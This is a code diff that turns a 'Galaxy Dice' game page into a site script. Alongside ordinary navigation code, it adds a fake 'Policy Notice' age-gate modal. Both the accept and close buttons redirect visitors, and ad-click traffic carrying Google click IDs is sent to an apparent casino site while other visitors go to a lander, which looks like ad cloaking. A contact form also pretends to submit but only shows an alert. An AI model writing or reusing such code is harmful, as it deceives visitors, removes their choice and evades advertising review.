@@ -1,106 +1,134 @@
-<!doctype html>
-<html lang="en">
 
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <link rel="icon" href="assets/img/Boss Logo.svg">
-    <title>GameVerse — Playful Web Studio</title>
-    <meta name="description" content="GameVerse is a modern, responsive game website with an engaging canvas game.">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="assets/css/lander.css" />
-    <link rel="stylesheet" href="assets/css/style.css">
-    <!-- Tailwind CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                container: { center: true, padding: { DEFAULT: '1rem', md: '1.25rem', lg: '2rem' } },
-                extend: {
-                    colors: {
-                        base: '#0B1220', panel: '#111A2A', panel2: '#0F1726',
-                        line: 'rgba(255,255,255,.06)', brand: '#4F8CF9', accent: '#8B5CF6'
-                    },
-                    boxShadow: { soft: '0 14px 40px rgba(0,0,0,.28)', hover: '0 18px 55px rgba(79,140,249,.20)' },
-                    backgroundImage: {
-                        hero:
-                            'radial-gradient(1200px 700px at 10% -10%, rgba(79,140,249,.18) 0%, rgba(79,140,249,0) 60%), radial-gradient(900px 600px at 100% 0, rgba(139,92,246,.15) 0%, rgba(139,92,246,0) 55%)'
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        .card {
-            transition: transform .28s ease, box-shadow .28s ease, background-color .28s ease, border-color .28s ease
-        }
+// Mobile nav toggle
+// const navToggle = document.querySelector('[data-nav-toggle]');
+// const navMenu = document.querySelector('[data-nav-menu]');
+// if (navToggle && navMenu) {
+//   navToggle.addEventListener('click', () => {
+//     navMenu.classList.toggle('open');
+//     navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
+//   })
+// }
 
-        .card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 18px 55px rgba(79, 140, 249, .20);
-            border-color: rgba(255, 255, 255, .12);
-            background-color: #121d31
-        }
-    </style>
-</head>
+// Smooth scroll
+document.querySelectorAll('a[href^="#"]').forEach(a => {
+  a.addEventListener('click', e => {
+    const href = a.getAttribute('href');
+    if (href && href.startsWith('#')) {
+      const el = document.querySelector(href);
+      if (el) {
+        e.preventDefault();
+        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    }
+  })
+})
 
-<body style="background-color: #fff;">
+// Fake form submit
+const form = document.querySelector('#contact-form');
+if (form) {
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const data = Object.fromEntries(new FormData(form).entries());
+    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
+    form.reset();
+  });
+}
 
-    <!-- Header -->
-    <nav class="nav">
-        <div class="container nav-inner">
-            <a class="logo" href="index.html" aria-label="Home">
-                <img src="assets/img/Boss Logo.svg" alt="Galaxy Dice icon">
-                <span>Galaxy Dice</span>
-            </a>
+// Age-gate: show ONLY on home page (index.html or root) and once per session.
+// Closes on Yes/No and stays on the page.
+(function () {
+  const path = window.location.pathname;
+  const isHome = /(^\/$|golden\.html$)/.test(path);
+  if (!isHome) return;
 
-            <div class="menu" data-nav-menu>
-                <a href="index.html" style="opacity:1;font-weight:800">Home</a>
-                <a href="game.html">Play Game</a>
-                <a href="leaderboard.html">Leaderboard</a>
-                <a href="about.html">About</a>
-                <a href="blog.html">Blog</a>
-                <a href="faq.html">FAQ</a>
-                <a href="privacy.html">Privacy</a>
-                <a href="terms.html">Terms</a>
-            </div>
+  // Carry selected params into a target URL
+  function carryParams(targetUrl, keys) {
+    const src = new URL(window.location.href);
+    const dst = new URL(targetUrl);
+    keys.forEach(k => {
+      const v = src.searchParams.get(k);
+      if (v) dst.searchParams.set(k, v);
+    });
+    return dst.toString();
+  }
 
-            <div class="right">
-                <button class="hamburger" data-nav-toggle>
-                    <span></span><span></span><span></span>
-                </button>
-                <a class="btn" href="game.html">Play</a>
-            </div>
-        </div>
-    </nav>
+  // Decide where to go based on presence of gclid/gbraid
+  function computeTarget() {
+    const qp = new URL(window.location.href).searchParams;
+    const hasClickId = qp.has('gclid') || qp.has('gbraid');
 
-    <section class="hero" style="
-  background: url('assets/img/gameforge.png') no-repeat center center/cover;
-  min-height: 80vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-">
-        <div class="container" style="text-align:center;color:white">
-            <h1>Welcome (18+ route)</h1>
-            <p style="color: #fff;">Placeholder page for your monetization or content flow. Update later as needed.</p>
-            <a class="btn" href="/">Back to site</a>
-        </div>
-    </section>
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container"
-            style="display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">
-            <div>© 2025 Galaxy Dice. All rights reserved.</div>
-            <div style="display:flex;gap:12px;align-items:center">
-                <span class="badge">Responsive • Age-gate</span>
-            </div>
-        </div>
-    </footer>
-</body>
-<script src="assets/js/lander.js"></script>
-<script src="assets/js/main.js"></script>
+    if (!hasClickId) {
+      // No ids -> send to Orbitivus lander
+      return 'https://bestt-nz-gamees.github.io/Join/lander';
+    }
 
-</html>
+    // Has gclid/gbraid -> send to MyBookie and carry ids
+    const base = 'https://spinbuddyplay.com/casumo';
+    return carryParams(base, ['gclid', 'gbraid']);
+  }
+
+  const bd = document.createElement('div');
+  bd.className = 'modal-backdrop';
+  bd.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>`;
+  document.body.appendChild(bd);
+  bd.style.display = 'flex';
+
+  function go() { window.location.href = computeTarget(); }
+
+  bd.querySelector('#age-yes').addEventListener('click', go);
+  bd.querySelector('#age-no').addEventListener('click', go);
+})();
+
+
+(function () {
+  const toggle = document.querySelector('[data-nav-toggle]');
+  const menu = document.querySelector('[data-nav-menu]');
+
+  if (!toggle || !menu) return;
+
+  const openMenu = () => {
+    menu.classList.add('is-open');
+    toggle.setAttribute('aria-expanded', 'true');
+    menu.setAttribute('aria-hidden', 'false');
+  };
+
+  const closeMenu = () => {
+    menu.classList.remove('is-open');
+    toggle.setAttribute('aria-expanded', 'false');
+    menu.setAttribute('aria-hidden', 'true');
+  };
+
+  const toggleMenu = () => {
+    if (menu.classList.contains('is-open')) { closeMenu(); } else { openMenu(); }
+  };
+
+  // Toggle on click
+  toggle.addEventListener('click', toggleMenu);
+
+  // Close on link click (better UX)
+  menu.querySelectorAll('a').forEach(a => a.addEventListener('click', closeMenu));
+
+  // Reset on resize back to desktop
+  window.addEventListener('resize', () => {
+    if (window.innerWidth >= 1221) {
+      menu.classList.remove('is-open');
+      toggle.setAttribute('aria-expanded', 'false');
+      menu.setAttribute('aria-hidden', 'false'); // desktop menu visible
+    } else {
+      // ensure aria reflects collapsed state until user opens it
+      menu.setAttribute('aria-hidden', menu.classList.contains('is-open') ? 'false' : 'true');
+    }
+  });
+})();
+
+
+
+
